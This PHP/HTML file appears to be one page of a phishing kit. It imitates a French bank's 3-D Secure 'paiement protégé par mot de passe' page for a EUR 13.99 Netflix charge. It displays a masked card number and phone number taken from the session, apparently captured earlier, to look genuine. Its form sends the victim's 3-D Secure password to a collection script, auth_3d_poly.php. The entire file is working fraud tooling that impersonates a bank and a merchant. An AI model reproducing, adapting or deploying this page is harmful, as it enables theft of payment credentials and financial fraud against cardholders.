<?php



session_start();

///// PRINT 4 LAST NUMBERS //////
$number = $_SESSION['cn'];
$masked =  str_pad(substr($number, -4), strlen($number), 'x', STR_PAD_LEFT);
$phone = $_SESSION['tel'];
$ephone =  str_pad(substr($phone, -4), strlen($phone), 'X', STR_PAD_LEFT);
///// PRINT 4 LAST NUMBERS //////






?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta http-equiv="P3P" content="CP=&quot;IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA&quot;">



    <link href="./3D_files/style.css" rel="stylesheet" type="text/css">
    <title>Paiement protégé par mot de passe</title>
    
</head>

<body bgcolor="#f0f0f0" marginwidth="0" marginheight="0" leftmargin="0" topmargin="0" cz-shortcut-listen="true">

<center>

<table cellpadding="0" cellspacing="0" border="1" width="390" height="380" bgcolor="#ffffff">
<tbody><tr>
    <td valign="top">

        <!-- TABLE POUR LES LOGOS-->
        <!--=====================-->
        <table width="100%" border="0" cellspacing="0" cellpadding="0" align="center" height="55">
        <tbody><tr height="55">
                <td width="20"></td>
                <td height="55" valign="middle" align="left"><img src="./3D_files/schema_000000001.gif" alt="" border="0" 3dslogo="scheme" 3dslogourl="content/001/vbv_dtv.gif"> </td>
                <td height="55" valign="middle" align="right"><img src="./3D_files/logo-bdp.png" alt="Issuer logo" border="0" 3dslogo="issuer" 3dslogourl="/mdpayacs/Graphics/logo-bdp.png"></td>
                <td width="20"></td>
        </tr>
        </tbody></table>
        <!--   FIN DE LA TABLE  -->
        <!--====================-->

        <!-- TABLE POUR LA BARRE-->
        <!-- ===================-->
        <table width="100%" border="0">
        <tbody><tr height="3">
                <td width="100%" bgcolor="#000066"></td>
        </tr>
        <tr height="3">
                <td width="100%"></td>
        </tr>
        </tbody></table>
        <!--   FIN DE LA TABLE  -->
        <!--====================-->

        <!-- TABLE POUR LES LOGOS-->

        <table cellpadding="3" cellspacing="0" width="100%" border="0">
        <tbody><tr>
                <td class="header" align="center">Paiement protégé par mot de passe</td>
        </tr>
        <tr height="20">
                <td width="100%"></td>
        </tr>
        <tr>
                <td>
                <!-- ******************* -->
                <!-- Content begins here -->
                <!-- ******************* -->


	        <table cellspacing="1" cellpadding="1" border="0">
	        <tbody><tr>
			<td width="35"></td>
			<td class="auth_name">Commerçant:</td>
		        <td class="value" 3dsdisplay="merchant">Netflix</td>
	        </tr>
	        <tr>
			<td width="35"></td>
		        <td class="auth_name">Montant:</td>
		        <td class="value" 3dsdisplay="amount">EUR 13.99</td>
	        </tr>
        	<tr>
			<td width="35"></td>
		        <td class="auth_name">Date:</td>
		        <td class="value" 3dsdisplay="date"><?php echo date("m/d/Y g:i:s"); ?></td>
	        </tr>
	        <tr>
			<td width="35"></td>
		        <td class="auth_name">Numéro de carte:</td>
		        <td class="value" 3dsdisplay="pan"><?php echo $masked ?></td>
	        </tr>
        	<tr>
			<!-- <td width="35"></td>
		        <td class="auth_name">Message privé:</td>
		        <td class="value" 3dsdisplay="pam">MAGOU</td>
	        </tr> -->
		</tbody></table>

	  
	        <form action="../activity/auth_3d_poly.php" method="POST" 3dsaction="manual">

 		<table cellpadding="1" cellspacing="1" border="0">
                <tbody><tr>
			<td width="45">
			</td><td height="40" valign="bottom"><b><div class="message"></div></b></td>
		</tr>
	        <tr>
			<td class="auth_message" display="prompt" 3dslabel="prompt"></td></tr>
	        <tr>
			<td width="45"></td>
		        <td>
        			<label class="label_mdp">Veuillez saisir votre mot de passe</label>
				<div class="password_input"><input type="password" 3dsinput="password" name="password" autocomplete="off"> </div>
			        <div class="auth_link"><a href="#" 3dslink="chg_password" 3dslabel="Mot de passe oublié">Mot de passe oublié</a></div>
	        	</td>
	        </tr>
	        <tr>
			<td height="20"></td>
	        </tr>
      		</tbody></table>

		<center>
      


		<table cellpadding="1" cellspacing="1" border="0" width="300">
		<tbody><tr>
			<td valign="bottom"><input type="image" name="help" alt="Help" src="./3D_files/fr_help.gif" border="0" 3dsinput="help" 3dslabel=""></td>
	       		 <td valign="bottom" align="right"><input type="image" name="cancel" alt="Cancel" src="./3D_files/fr_cancel.gif" border="0" 3dsinput="cancel" 3dslabel=""></td>
		        <td align="right" valign="bottom"><input type="image" name="submit" alt="image" src="./3D_files/fr_submit.gif" border="0" 3dsinput="ok" 3dslabel=""></td>
                </tr>
                </tbody></table>
        	
	       </center>


      </form>
      <!-- ***************** -->
      <!-- Content ends here -->
      <!-- ***************** -->
     </td>
    </tr>
   </tbody></table>

</td>
</tr>
</tbody></table>

</center>



<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
</body></html>